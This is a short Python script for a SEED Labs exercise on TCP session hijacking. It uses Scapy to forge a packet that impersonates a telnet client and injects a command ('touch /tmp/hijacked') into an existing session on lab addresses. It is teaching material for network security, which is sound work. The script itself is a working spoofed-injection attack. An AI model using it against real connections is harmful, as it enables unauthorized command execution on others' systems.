#!/usr/bin/env python3
"""
Task 3: TCP Session Hijacking (Manual)
SEED Labs - TCP/IP Attack Lab

This script sends a spoofed TCP packet carrying malicious data into an
existing telnet session.  All values must be obtained from Wireshark
before running the script.

Usage:
    1. Capture traffic with Wireshark and note the current TCP parameters
       for the active telnet session you want to hijack.
    2. Fill in the variables below.
    3. Run:  python3 session_hijack.py
"""

from scapy.all import *

# ------------------------------------------------------------------
# Fill in these values from Wireshark before running the script.
# ------------------------------------------------------------------
SRC_IP  = "10.9.0.6"   # telnet client IP (packet appears to come from client)
DST_IP  = "10.9.0.5"   # telnet server IP
SPORT   = 12345         # client-side source port (from Wireshark)
DPORT   = 23            # telnet destination port
SEQ     = 0             # next expected sequence number (from Wireshark)
ACK     = 0             # acknowledgement number (from Wireshark)
DATA    = "\r touch /tmp/hijacked \r"  # malicious command to inject
# ------------------------------------------------------------------

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="A", seq=SEQ, ack=ACK)
pkt = ip / tcp / DATA

ls(pkt)
send(pkt, verbose=0)
print("Malicious packet sent – check the server for the injected command.")
